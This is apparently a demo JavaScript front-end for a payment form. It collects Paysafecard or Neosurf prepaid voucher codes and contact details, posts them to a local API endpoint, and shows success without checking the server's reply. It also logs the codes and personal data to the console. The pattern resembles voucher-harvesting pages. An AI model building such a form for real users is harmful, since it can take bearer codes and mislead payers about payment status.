document.addEventListener("DOMContentLoaded", function() {
    console.log("🚀 Payment Demo chargé !");

    // Éléments DOM
    const paymentMethod = document.getElementById('paymentMethod');
    const paysafecardGroup = document.getElementById('paysafecardGroup');
    const neosurfGroup = document.getElementById('neosurfGroup');
    const paysafecardCode = document.getElementById('paysafecardCode');
    const neosurfCode = document.getElementById('neosurfCode');
    const paymentForm = document.getElementById('paymentForm');
    const submitBtn = document.getElementById('submitBtn');

    // 🔍 VÉRIFICATION ÉLÉMENTS
    if (!paymentMethod || !paysafecardGroup || !neosurfGroup || !paysafecardCode || !neosurfCode || !paymentForm || !submitBtn) {
        console.error('❌ Éléments manquants:', {
            paymentMethod: !!paymentMethod,
            paysafecardGroup: !!paysafecardGroup,
            neosurfGroup: !!neosurfGroup,
            paysafecardCode: !!paysafecardCode,
            neosurfCode: !!neosurfCode,
            paymentForm: !!paymentForm,
            submitBtn: !!submitBtn
        });
        return;
    }

    console.log("✅ Tous les éléments trouvés");

    // 1. MENU DÉROULANT
    paymentMethod.addEventListener('change', function() {
        console.log('🔁 Méthode:', this.value);
        paysafecardGroup.style.display = 'none';
        neosurfGroup.style.display = 'none';
        paysafecardCode.value = '';
        neosurfCode.value = '';
        
        if (this.value === 'paysafecard') {
            paysafecardGroup.style.display = 'block';
        } else if (this.value === 'neosurf') {
            neosurfGroup.style.display = 'block';
        }
    });

    // 2. FORMATAGE PAYS AFECARD
    paysafecardCode.addEventListener('input', function() {
        let value = this.value.replace(/[\s-]/g, '');
        let formatted = '';
        for (let i = 0; i < value.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatted += '-';
            formatted += value[i];
        }
        this.value = formatted;
    });

    // 3. SEULEMENT CHIFFRES
    [paysafecardCode, neosurfCode].forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) {
                e.preventDefault();
            }
        });
    });

    // 4. SUBMIT PRINCIPAL
    paymentForm.addEventListener('submit', handleSubmit);

    async function handleSubmit(e) {
        e.preventDefault();
        console.log('🚀 Submit !');

        // Validation
        const method = paymentMethod.value;
        let code = '';
        
        if (method === 'paysafecard') {
            code = paysafecardCode.value.replace(/[-]/g, '');
            if (code.length !== 16) return alert('Paysafecard: 16 chiffres');
        } else if (method === 'neosurf') {
            code = neosurfCode.value.replace(/\s+/g, '');
            if (code.length !== 10) return alert('Neosurf: 10 chiffres');
        } else {
            return alert('Choisis une méthode de paiement');
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '⏳ Backend...';

        try {
            const data = {
                code: code,
                method: method.toUpperCase(),
                name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                timestamp: new Date().toISOString()
            };

            console.log('📤 Envoi backend:', data);

            // BACKEND VERCEL
            const response = await fetch('/api/payment', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            const result = await response.json();
            console.log('✅ Backend OK:', result);
            
            paymentForm.style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
        } catch (error) {
            console.error('❌ Backend erreur:', error);
            alert('Erreur backend: ' + error.message);
        } finally {
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Complete Payment';
        }
    }

    // FONCTIONS GLOBALES (pour boutons HTML)
    window.showSuccess = function() {
        console.log("✅ SUCCESS !");
        paymentForm.style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
    };

    window.showError = function(msg) {
        console.log("❌", msg);
        alert(msg);
    };

    window.resetForm = function() {
        paymentForm.style.display = 'flex';
        document.getElementById('successMessage').style.display = 'none';
        document.getElementById('errorMessage').style.display = 'none';
        paymentForm.reset();
        paysafecardGroup.style.display = 'none';
        neosurfGroup.style.display = 'none';
    };

    window.viewPayments = () => {
        const payments = JSON.parse(localStorage.getItem('payments') || '[]');
        console.table(payments);
    };

    console.log("🎯 Payment script prêt !");
});

